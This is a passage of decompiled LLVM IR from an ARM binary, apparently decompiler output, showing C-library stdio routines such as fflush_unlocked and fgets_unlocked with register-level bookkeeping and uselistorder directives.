  %v2_1a640 = load i32, i32* @global_var_2f5f0.1623, align 4
  %tmp19 = icmp slt i32 %v2_1a640, 1
  br i1 %tmp19, label %dec_label_pc_1a6e8, label %dec_label_pc_1a64c

dec_label_pc_1a64c:                               ; preds = %dec_label_pc_1a63c
  store i32 %v2_1a600, i32* @r0, align 4
  %v1_1a65c = call i32 @__pthread_return_void()
  %v1_1a668 = call i32 @__pthread_return_0()
  %v2_1a670 = load i32, i32* bitcast (i32** @global_var_2b274.1329 to i32*), align 4
  store i32 %v2_1a670, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_1a6c03 = icmp eq i32 %v2_1a670, 0
  br i1 %v2_1a6c03, label %dec_label_pc_1a6cc, label %dec_label_pc_1a67c

dec_label_pc_1a67c:                               ; preds = %dec_label_pc_1a64c, %dec_label_pc_1a6bc
  %v1_1a694 = phi i32 [ %v0_1a6bc, %dec_label_pc_1a6bc ], [ %v2_1a670, %dec_label_pc_1a64c ]
  %v1_1a67c = inttoptr i32 %v1_1a694 to i8*
  %v2_1a67c = load i8, i8* %v1_1a67c, align 1
  %v3_1a67c = zext i8 %v2_1a67c to i32
  %v1_1a680 = add i32 %v1_1a694, 1
  %v2_1a680 = inttoptr i32 %v1_1a680 to i8*
  %v3_1a680 = load i8, i8* %v2_1a680, align 1
  %v4_1a680 = zext i8 %v3_1a680 to i32
  %v4_1a684 = mul nuw nsw i32 %v4_1a680, 256
  %v5_1a684 = or i32 %v4_1a684, %v3_1a67c
  %v2_1a688 = and i32 %v5_1a684, 32816
  %v7_1a68c = icmp eq i32 %v2_1a688, 48
  %v1_1a690 = add i32 %v1_1a694, 32
  %v2_1a690 = inttoptr i32 %v1_1a690 to i32*
  %v3_1a690 = load i32, i32* %v2_1a690, align 4
  store i32 %v3_1a690, i32* %r5.global-to-local, align 4
  br i1 %v7_1a68c, label %dec_label_pc_1a69c, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_1a67c
  store i32 %v1_1a694, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1a6bc

dec_label_pc_1a69c:                               ; preds = %dec_label_pc_1a67c
  %v0_1a69c = load i32, i32* %r6.global-to-local, align 4
  %v2_1a69c = icmp eq i32 %v0_1a69c, 0
  br i1 %v2_1a69c, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_1a69c
  %v3_1a6a4 = add i32 %v0_1a69c, 32
  %v4_1a6a4 = inttoptr i32 %v3_1a6a4 to i32*
  store i32 %v3_1a690, i32* %v4_1a6a4, align 4
  %v0_1a6ac.pre = load i32, i32* %r4.global-to-local, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_1a69c
  store i32 %v3_1a690, i32* bitcast (i32** @global_var_2b274.1329 to i32*), align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_1a6ac = phi i32 [ %v0_1a6ac.pre, %.thread ], [ %v1_1a694, %.thread1 ]
  %v1_1a6ac = add i32 %v0_1a6ac, 1
  %v2_1a6ac = inttoptr i32 %v1_1a6ac to i8*
  %v3_1a6ac = load i8, i8* %v2_1a6ac, align 1
  %v1_1a6b0 = and i8 %v3_1a6ac, 32
  %v1_1a6b8 = icmp ne i8 %v1_1a6b0, 0
  call void @__pseudo_cond_branch(i1 %v1_1a6b8, i32 ptrtoint (i32* @global_var_167c4.1585 to i32))
  %v0_1a6bc.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1a6bc

dec_label_pc_1a6bc:                               ; preds = %.thread12, %bb
  %v0_1a6bc = phi i32 [ %v0_1a6bc.pre, %bb ], [ %v3_1a690, %.thread12 ]
  store i32 %v0_1a6bc, i32* %r4.global-to-local, align 4
  %v2_1a6c0 = icmp eq i32 %v0_1a6bc, 0
  br i1 %v2_1a6c0, label %dec_label_pc_1a6cc, label %dec_label_pc_1a67c

dec_label_pc_1a6cc:                               ; preds = %dec_label_pc_1a6bc, %dec_label_pc_1a64c
  store i32 %v2_1a600, i32* @r0, align 4
  %v1_1a6dc = call i32 @__pthread_return_void()
  %v0_1a6e4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1a6e4, i32* @global_var_2f5f0.1623, align 4
  %v2_1a6ec.pre = load i32, i32* @global_var_2f5ec.1619, align 4
  br label %dec_label_pc_1a6e8

dec_label_pc_1a6e8:                               ; preds = %entry, %dec_label_pc_1a63c, %dec_label_pc_1a6cc
  %v2_1a6ec = phi i32 [ %v2_1a630, %entry ], [ 1, %dec_label_pc_1a63c ], [ %v2_1a6ec.pre, %dec_label_pc_1a6cc ]
  %v1_1a6f0 = add i32 %v2_1a6ec, -1
  store i32 %v1_1a6f0, i32* @global_var_2f5ec.1619, align 4
  store i32 %v2_1a604, i32* @r0, align 4
  store i32 108300, i32* @lr, align 4
  %v1_1a708 = call i32 @__pthread_return_void()
  ret i32 %v1_1a708

; uselistorder directives
  uselistorder i32 %v0_1a6bc, { 2, 1, 0 }
  uselistorder i32 %v3_1a690, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1a694, { 0, 1, 2, 4, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder i8 32, { 0, 7, 1, 2, 3, 5, 4, 8, 9, 10, 6, 11, 12, 13 }
  uselistorder i32* @global_var_2f5f0.1623, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1a6e8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a6bc, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_1a67c, { 1, 0 }
}

define i32 @fflush_unlocked(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_1a73c = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32** @global_var_2b274.1329 to i32), i32* %r3.global-to-local, align 4
  %v10_1a744 = icmp eq i8* %arg1, bitcast (i32** @global_var_2b274.1329 to i8*)
  store i1 %v10_1a744, i1* %cpsr_z.global-to-local, align 1
  %.v1_1a748 = select i1 %v10_1a744, i32 0, i32 %tmp
  store i32 %.v1_1a748, i32* %r8.global-to-local, align 4
  %v2_1a750 = ptrtoint i32* %stack_var_-44 to i32
  br i1 %v10_1a744, label %bb, label %dec_label_pc_1a75c

bb:                                               ; preds = %entry
  store i32 %.v1_1a748, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1a768

dec_label_pc_1a75c:                               ; preds = %entry
  %v2_1a75c = icmp eq i32 %.v1_1a748, 0
  store i1 %v2_1a75c, i1* %cpsr_z.global-to-local, align 1
  store i32 256, i32* %sl.global-to-local, align 4
  br i1 %v2_1a75c, label %dec_label_pc_1a768, label %dec_label_pc_1a8b4

dec_label_pc_1a768:                               ; preds = %bb, %dec_label_pc_1a75c
  store i32 ptrtoint (i8* @global_var_176d8.1331 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_1a750, i32* @r0, align 4
  %v1_1a77c = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_2b290.1327 to i32), i32* %r0.global-to-local, align 4
  %v1_1a78c = call i32 @__pthread_return_0()
  %v2_1a794 = load i32, i32* @global_var_2f5ec.1619, align 4
  %v1_1a798 = add i32 %v2_1a794, 1
  store i32 %v1_1a798, i32* %r3.global-to-local, align 4
  store i32 %v1_1a798, i32* @global_var_2f5ec.1619, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_1a750, i32* @r0, align 4
  %v1_1a7b0 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_176d8.1331 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_1a750, i32* @r0, align 4
  %v1_1a7c4 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_2b278.1325 to i32), i32* %r0.global-to-local, align 4
  %v1_1a7d0 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_2b274.1329 to i32), i32* %r3.global-to-local, align 4
  store i32 %v2_1a750, i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_1a7e0 = load i32, i32* bitcast (i32** @global_var_2b274.1329 to i32*), align 4
  store i32 %v2_1a7e0, i32* @r6, align 4
  %v1_1a7e8 = call i32 @__pthread_return_void()
  store i32 %v1_1a7e8, i32* %r0.global-to-local, align 4
  store i32 %v2_1a750, i32* @r4, align 4
  %v0_1a7f0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1a7f0, i32* @r5, align 4
  %v0_1a8a4.pr = load i32, i32* @r6, align 4
  %v2_1a8a425 = icmp eq i32 %v0_1a8a4.pr, 0
  store i1 %v2_1a8a425, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a8a425, label %dec_label_pc_1a8ac, label %dec_label_pc_1a7f8

dec_label_pc_1a7f8:                               ; preds = %dec_label_pc_1a768, %.thread11
  %v0_1a814 = phi i32 [ %v3_1a8a0, %.thread11 ], [ %v0_1a8a4.pr, %dec_label_pc_1a768 ]
  %v1_1a7f8 = inttoptr i32 %v0_1a814 to i8*
  %v2_1a7f8 = load i8, i8* %v1_1a7f8, align 1
  %v3_1a7f8 = zext i8 %v2_1a7f8 to i32
  store i32 %v3_1a7f8, i32* %r3.global-to-local, align 4
  %v1_1a7fc = and i32 %v3_1a7f8, 64
  %v2_1a7fc = icmp eq i32 %v1_1a7fc, 0
  store i1 %v2_1a7fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a7fc, label %.thread11, label %dec_label_pc_1a804

dec_label_pc_1a804:                               ; preds = %dec_label_pc_1a7f8
  %v2_1a808 = load i32, i32* @global_var_2b2a8.1635, align 4
  store i32 %v2_1a808, i32* %r3.global-to-local, align 4
  %v7_1a80c = icmp eq i32 %v2_1a808, 2
  store i1 %v7_1a80c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a80c, label %dec_label_pc_1a840, label %dec_label_pc_1a814

dec_label_pc_1a814:                               ; preds = %dec_label_pc_1a804
  %v1_1a814 = add i32 %v0_1a814, 56
  store i32 %v1_1a814, i32* @r4, align 4
  store i32 %v2_1a750, i32* @r0, align 4
  store i32 95968, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_176d8.1331 to i32), i32* %r1.global-to-local, align 4
  %v1_1a82c = call i32 @__pthread_return_void()
  %v0_1a830 = load i32, i32* @r4, align 4
  store i32 %v0_1a830, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_176d8.1331 to i32), i32* %r3.global-to-local, align 4
  %v1_1a83c = call i32 @__pthread_return_0()
  store i32 %v1_1a83c, i32* %r0.global-to-local, align 4
  %v0_1a840.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1a840

dec_label_pc_1a840:                               ; preds = %dec_label_pc_1a804, %dec_label_pc_1a814
  %v0_1a854 = phi i32 [ %v0_1a814, %dec_label_pc_1a804 ], [ %v0_1a840.pre, %dec_label_pc_1a814 ]
  %v1_1a840 = inttoptr i32 %v0_1a854 to i32*
  %v2_1a840 = load i32, i32* %v1_1a840, align 4
  %v0_1a844 = load i32, i32* %sl.global-to-local, align 4
  %v2_1a844 = or i32 %v0_1a844, %v2_1a840
  %v1_1a848 = xor i32 %v2_1a844, 320
  store i32 %v1_1a848, i32* %r3.global-to-local, align 4
  %v1_1a84c = and i32 %v1_1a848, 832
  %v2_1a84c = icmp eq i32 %v1_1a84c, 0
  store i1 %v2_1a84c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a84c, label %dec_label_pc_1a854, label %bb39

dec_label_pc_1a854:                               ; preds = %dec_label_pc_1a840
  store i32 %v0_1a854, i32* @r0, align 4
  %v0_1a858 = call i32 @__stdio_wcommit()
  store i32 %v0_1a858, i32* %r0.global-to-local, align 4
  %v2_1a85c = icmp eq i32 %v0_1a858, 0
  store i1 %v2_1a85c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a85c, label %.thread5, label %.thread7

.thread5:                                         ; preds = %dec_label_pc_1a854
  %v1_1a860 = load i32, i32* @r6, align 4
  %v2_1a860 = inttoptr i32 %v1_1a860 to i32*
  %v3_1a860 = load i32, i32* %v2_1a860, align 4
  store i32 %v3_1a860, i32* %r3.global-to-local, align 4
  %v2_1a864 = add i32 %v1_1a860, 8
  %v3_1a864 = inttoptr i32 %v2_1a864 to i32*
  %v4_1a864 = load i32, i32* %v3_1a864, align 4
  %v2_1a868 = and i32 %v3_1a860, -65
  store i32 %v2_1a868, i32* %r3.global-to-local, align 4
  %v4_1a86c = sdiv i32 %v3_1a860, 256
  store i32 %v4_1a86c, i32* %r1.global-to-local, align 4
  %v3_1a870 = add i32 %v1_1a860, 28
  %v4_1a870 = inttoptr i32 %v3_1a870 to i32*
  store i32 %v4_1a864, i32* %v4_1a870, align 4
  %v1_1a874 = load i32, i32* %r1.global-to-local, align 4
  %v2_1a874 = trunc i32 %v1_1a874 to i8
  %v3_1a874 = load i32, i32* @r6, align 4
  %v4_1a874 = add i32 %v3_1a874, 1
  %v5_1a874 = inttoptr i32 %v4_1a874 to i8*
  store i8 %v2_1a874, i8* %v5_1a874, align 1
  %v0_1a878.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a878.pr.pr.pr, label %.thread6, label %.thread7

.thread6:                                         ; preds = %.thread5
  %v1_1a878 = load i32, i32* %r3.global-to-local, align 4
  %v2_1a878 = trunc i32 %v1_1a878 to i8
  %v3_1a878 = load i32, i32* @r6, align 4
  %v4_1a878 = inttoptr i32 %v3_1a878 to i8*
  store i8 %v2_1a878, i8* %v4_1a878, align 1
  %v0_1a87c.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a87c.pr.pr.pr, label %bb39, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_1a854, %.thread5, %.thread6
  store i32 -1, i32* @r5, align 4
  br label %bb39

bb39:                                             ; preds = %dec_label_pc_1a840, %.thread6, %.thread7
  %v2_1a884 = load i32, i32* @global_var_2b2a8.1635, align 4
  store i32 %v2_1a884, i32* %r3.global-to-local, align 4
  %v7_1a888 = icmp eq i32 %v2_1a884, 2
  store i1 %v7_1a888, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a888, label %.thread11, label %bb40

bb40:                                             ; preds = %bb39
  store i32 %v2_1a750, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 95968, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 95968)
  br label %.thread11

.thread11:                                        ; preds = %bb39, %dec_label_pc_1a7f8, %bb40
  %v0_1a8a0 = load i32, i32* @r6, align 4
  %v1_1a8a0 = add i32 %v0_1a8a0, 32
  %v2_1a8a0 = inttoptr i32 %v1_1a8a0 to i32*
  %v3_1a8a0 = load i32, i32* %v2_1a8a0, align 4
  store i32 %v3_1a8a0, i32* @r6, align 4
  %v2_1a8a4 = icmp eq i32 %v3_1a8a0, 0
  store i1 %v2_1a8a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a8a4, label %dec_label_pc_1a8a4.dec_label_pc_1a8ac_crit_edge, label %dec_label_pc_1a7f8

dec_label_pc_1a8a4.dec_label_pc_1a8ac_crit_edge:  ; preds = %.thread11
  %v0_1a8ac.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a8ac

dec_label_pc_1a8ac:                               ; preds = %dec_label_pc_1a8a4.dec_label_pc_1a8ac_crit_edge, %dec_label_pc_1a768
  %v0_1a8ac = phi i32 [ %v0_1a8ac.pre, %dec_label_pc_1a8a4.dec_label_pc_1a8ac_crit_edge ], [ %v1_1a7e8, %dec_label_pc_1a768 ]
  %v1_1a8ac = call i32 @_stdio_openlist_dec_use(i32 %v0_1a8ac)
  store i32 %v1_1a8ac, i32* %r0.global-to-local, align 4
  %v0_1a8f0.pre = load i32, i32* @r5, align 4
  br label %bb43

dec_label_pc_1a8b4:                               ; preds = %dec_label_pc_1a75c
  %v1_1a8b4 = inttoptr i32 %.v1_1a748 to i8*
  %v2_1a8b4 = load i8, i8* %v1_1a8b4, align 1
  %v3_1a8b4 = zext i8 %v2_1a8b4 to i32
  %v1_1a8b8 = and i32 %v3_1a8b4, 64
  store i32 %v1_1a8b8, i32* %r3.global-to-local, align 4
  %v2_1a8b8 = icmp eq i32 %v1_1a8b8, 0
  store i1 %v2_1a8b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a8b8, label %bb41, label %dec_label_pc_1a8c4

bb41:                                             ; preds = %dec_label_pc_1a8b4
  br label %bb43

dec_label_pc_1a8c4:                               ; preds = %dec_label_pc_1a8b4
  %v0_1a8c4 = call i32 @__stdio_wcommit()
  store i32 %v0_1a8c4, i32* %r0.global-to-local, align 4
  %v2_1a8c8 = icmp eq i32 %v0_1a8c4, 0
  store i1 %v2_1a8c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a8c8, label %.thread16, label %bb42

.thread16:                                        ; preds = %dec_label_pc_1a8c4
  %v1_1a8cc = load i32, i32* %r8.global-to-local, align 4
  %v2_1a8cc = inttoptr i32 %v1_1a8cc to i32*
  %v3_1a8cc = load i32, i32* %v2_1a8cc, align 4
  store i32 %v3_1a8cc, i32* %r3.global-to-local, align 4
  %v2_1a8d0 = add i32 %v1_1a8cc, 8
  %v3_1a8d0 = inttoptr i32 %v2_1a8d0 to i32*
  %v4_1a8d0 = load i32, i32* %v3_1a8d0, align 4
  store i32 %v4_1a8d0, i32* %r1.global-to-local, align 4
  %v2_1a8d4 = and i32 %v3_1a8cc, -65
  store i32 %v2_1a8d4, i32* %r3.global-to-local, align 4
  %v4_1a8d8 = sdiv i32 %v3_1a8cc, 256
  %v2_1a8dc = trunc i32 %v4_1a8d8 to i8
  %v4_1a8dc = add i32 %v1_1a8cc, 1
  %v5_1a8dc = inttoptr i32 %v4_1a8dc to i8*
  store i8 %v2_1a8dc, i8* %v5_1a8dc, align 1
  %v0_1a8e0.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a8e0.pr.pr.pr, label %.thread18, label %.thread21

.thread18:                                        ; preds = %.thread16
  %v1_1a8e0 = load i32, i32* %r1.global-to-local, align 4
  %v2_1a8e0 = load i32, i32* %r8.global-to-local, align 4
  %v3_1a8e0 = add i32 %v2_1a8e0, 28
  %v4_1a8e0 = inttoptr i32 %v3_1a8e0 to i32*
  store i32 %v1_1a8e0, i32* %v4_1a8e0, align 4
  %v1_1a8e4 = load i32, i32* %r3.global-to-local, align 4
  %v2_1a8e4 = trunc i32 %v1_1a8e4 to i8
  %v3_1a8e4 = load i32, i32* %r8.global-to-local, align 4
  %v4_1a8e4 = inttoptr i32 %v3_1a8e4 to i8*
  store i8 %v2_1a8e4, i8* %v4_1a8e4, align 1
  %v0_1a8e8.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a8e8.pr.pr.pr, label %.thread20, label %.thread21

.thread21:                                        ; preds = %.thread16, %.thread18
  br label %bb43

bb42:                                             ; preds = %dec_label_pc_1a8c4
  br label %bb43

.thread20:                                        ; preds = %.thread18
  br label %bb43

bb43:                                             ; preds = %bb41, %bb42, %.thread21, %dec_label_pc_1a8ac, %.thread20
  %v0_1a8f0 = phi i32 [ -1, %.thread21 ], [ 0, %bb41 ], [ %v0_1a8f0.pre, %dec_label_pc_1a8ac ], [ -1, %bb42 ], [ 0, %.thread20 ]
  store i32 %v0_1a8f0, i32* %r0.global-to-local, align 4
  store i32 %v3_1a73c, i32* @r4, align 4
  ret i32 %v0_1a8f0

; uselistorder directives
  uselistorder i32 %v0_1a8f0, { 1, 0 }
  uselistorder i32 %v3_1a8a0, { 1, 2, 0 }
  uselistorder i32 %v2_1a750, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 9, 4, 10, 1, 6, 0, 7, 8 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 12, 5, 7, 6, 8, 9, 10, 11, 0, 13, 14 }
  uselistorder i32 (i32)* @_stdio_openlist_dec_use, { 1, 0 }
  uselistorder i32 95968, { 0, 4, 5, 6, 1, 2, 7, 8, 9, 10, 11, 3 }
  uselistorder i32* bitcast (i32** @global_var_2b274.1329 to i32*), { 3, 0, 4, 5, 1, 2 }
  uselistorder i32* @global_var_2f5ec.1619, { 1, 4, 2, 0, 5, 3, 6 }
  uselistorder i32 ()* @__pthread_return_0, { 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 17, 16, 5, 4, 37, 40, 39, 20, 3, 2, 1, 15, 0, 14, 13, 12, 11, 10, 9, 8, 7, 6, 18, 19, 38 }
  uselistorder i32 ()* @__pthread_return_void, { 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 7, 6, 5, 4, 3, 2, 1, 0, 43, 42, 47, 46, 45, 44, 12, 11, 9, 8, 10 }
  uselistorder i32 ptrtoint (i8* @global_var_176d8.1331 to i32), { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %bb43, { 4, 1, 2, 0, 3 }
  uselistorder label %.thread21, { 1, 0 }
  uselistorder label %.thread11, { 2, 0, 1 }
  uselistorder label %bb39, { 2, 1, 0 }
  uselistorder label %.thread7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a840, { 1, 0 }
  uselistorder label %dec_label_pc_1a7f8, { 1, 0 }
  uselistorder label %dec_label_pc_1a768, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1a924 = icmp eq i32 %arg2, 0
  store i1 %v2_1a924, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp14 = icmp slt i32 %arg2, 1
  br i1 %tmp14, label %dec_label_pc_1a9ac, label %dec_label_pc_1a990.preheader

dec_label_pc_1a990.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  %v1_1a99015 = add i32 %arg2, -1
  store i32 %v1_1a99015, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_1a99021 = icmp eq i32 %arg2, 1
  store i1 %v7_1a99021, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a99021, label %dec_label_pc_1a99c, label %dec_label_pc_1a93c

dec_label_pc_1a93c:                               ; preds = %dec_label_pc_1a990.preheader, %dec_label_pc_1a990.backedge
  %v1_1a99424.in = phi i32 [ %v0_1a994.pre, %dec_label_pc_1a990.backedge ], [ %arg3, %dec_label_pc_1a990.preheader ]
  %v1_1a93c = add i32 %v1_1a99424.in, 16
  %v2_1a93c = inttoptr i32 %v1_1a93c to i32*
  %v3_1a93c = load i32, i32* %v2_1a93c, align 4
  store i32 %v3_1a93c, i32* %r2.global-to-local, align 4
  %v1_1a940 = add i32 %v1_1a99424.in, 24
  %v2_1a940 = inttoptr i32 %v1_1a940 to i32*
  %v3_1a940 = load i32, i32* %v2_1a940, align 4
  %v3_1a944 = icmp uge i32 %v3_1a93c, %v3_1a940
  store i1 %v3_1a944, i1* %cpsr_c.global-to-local, align 1
  %v9_1a944 = icmp eq i32 %v3_1a93c, %v3_1a940
  store i1 %v9_1a944, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1a944, label %dec_label_pc_1a964, label %dec_label_pc_1a94c

dec_label_pc_1a94c:                               ; preds = %dec_label_pc_1a93c
  %v1_1a94c = inttoptr i32 %v3_1a93c to i8*
  %v2_1a94c = load i8, i8* %v1_1a94c, align 1
  %v5_1a94c = add i32 %v3_1a93c, 1
  store i32 %v5_1a94c, i32* %r2.global-to-local, align 4
  %v2_1a950 = load i32, i32* @r4, align 4
  %v3_1a950 = inttoptr i32 %v2_1a950 to i8*
  store i8 %v2_1a94c, i8* %v3_1a950, align 1
  %v0_1a954 = load i32, i32* @r4, align 4
  %v1_1a954 = inttoptr i32 %v0_1a954 to i8*
  %v2_1a954 = load i8, i8* %v1_1a954, align 1
  %v5_1a954 = add i32 %v0_1a954, 1
  store i32 %v5_1a954, i32* @r4, align 4
  %v2_1a958 = icmp ugt i8 %v2_1a954, 9
  store i1 %v2_1a958, i1* %cpsr_c.global-to-local, align 1
  %v7_1a958 = icmp eq i8 %v2_1a954, 10
  store i1 %v7_1a958, i1* %cpsr_z.global-to-local, align 1
  %v0_1a95c = load i32, i32* %r2.global-to-local, align 4
  %v1_1a95c = load i32, i32* @r5, align 4
  %v2_1a95c = add i32 %v1_1a95c, 16
  %v3_1a95c = inttoptr i32 %v2_1a95c to i32*
  store i32 %v0_1a95c, i32* %v3_1a95c, align 4
  br i1 %v7_1a958, label %dec_label_pc_1a99c, label %dec_label_pc_1a990.backedge

dec_label_pc_1a964:                               ; preds = %dec_label_pc_1a93c
  %v1_1a99424 = inttoptr i32 %v1_1a99424.in to i8*
  %v3_1a964 = call i32 @getc_unlocked(i8* %v1_1a99424)
  %v4_1a964 = trunc i32 %v3_1a964 to i8
  %v5_1a968 = icmp eq i8 %v4_1a964, -1
  store i1 %v5_1a968, i1* %cpsr_c.global-to-local, align 1
  %v10_1a968 = icmp eq i32 %v3_1a964, -1
  store i1 %v10_1a968, i1* %cpsr_z.global-to-local, align 1
  br i1 %v5_1a968, label %dec_label_pc_1a970, label %dec_label_pc_1a98c

dec_label_pc_1a970:                               ; preds = %dec_label_pc_1a964
  %v0_1a970 = load i32, i32* @r5, align 4
  %v1_1a970 = inttoptr i32 %v0_1a970 to i8*
  %v2_1a970 = load i8, i8* %v1_1a970, align 1
  %v1_1a974 = and i8 %v2_1a970, 8
  %v2_1a974 = icmp eq i8 %v1_1a974, 0
  store i1 %v2_1a974, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a974, label %dec_label_pc_1a99c, label %dec_label_pc_1a9ac

dec_label_pc_1a98c:                               ; preds = %dec_label_pc_1a964
  %v3_1a980 = load i32, i32* @r4, align 4
  %v4_1a980 = inttoptr i32 %v3_1a980 to i8*
  store i8 %v4_1a964, i8* %v4_1a980, align 1
  %v0_1a984 = load i32, i32* @r4, align 4
  %v1_1a984 = inttoptr i32 %v0_1a984 to i8*
  %v2_1a984 = load i8, i8* %v1_1a984, align 1
  %v5_1a984 = add i32 %v0_1a984, 1
  store i32 %v5_1a984, i32* @r4, align 4
  %v2_1a988 = icmp ugt i8 %v2_1a984, 9
  store i1 %v2_1a988, i1* %cpsr_c.global-to-local, align 1
  %v7_1a988 = icmp eq i8 %v2_1a984, 10
  store i1 %v7_1a988, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a988, label %dec_label_pc_1a99c, label %dec_label_pc_1a990.backedge

dec_label_pc_1a990.backedge:                      ; preds = %dec_label_pc_1a98c, %dec_label_pc_1a94c
  %v0_1a990.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_1a994.pre = load i32, i32* @r5, align 4
  %v1_1a990 = add i32 %v0_1a990.pre, -1
  store i32 %v1_1a990, i32* %r6.global-to-local, align 4
  %v2_1a990 = icmp ne i32 %v0_1a990.pre, 0
  store i1 %v2_1a990, i1* %cpsr_c.global-to-local, align 1
  %v7_1a990 = icmp eq i32 %v0_1a990.pre, 1
  store i1 %v7_1a990, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a990, label %dec_label_pc_1a99c, label %dec_label_pc_1a93c

dec_label_pc_1a99c:                               ; preds = %dec_label_pc_1a990.preheader, %dec_label_pc_1a98c, %dec_label_pc_1a990.backedge, %dec_label_pc_1a94c, %dec_label_pc_1a970
  %v0_1a99c = load i32, i32* @r4, align 4
  %v1_1a99c = load i32, i32* %r7.global-to-local, align 4
  %v3_1a99c = icmp uge i32 %v0_1a99c, %v1_1a99c
  store i1 %v3_1a99c, i1* %cpsr_c.global-to-local, align 1
  %v9_1a99c = icmp eq i32 %v0_1a99c, %v1_1a99c
  store i1 %v9_1a99c, i1* %cpsr_z.global-to-local, align 1
  %v2_1a9a0 = xor i1 %v9_1a99c, true
  %v3_1a9a0 = and i1 %v3_1a99c, %v2_1a9a0
  br i1 %v3_1a9a0, label %bb, label %.thread7

bb:                                               ; preds = %dec_label_pc_1a99c
  %v7_1a9a4 = inttoptr i32 %v0_1a99c to i8*
  store i8 0, i8* %v7_1a9a4, align 1
  %v0_1a9a8.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_1a9a8.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_1a99c, %bb
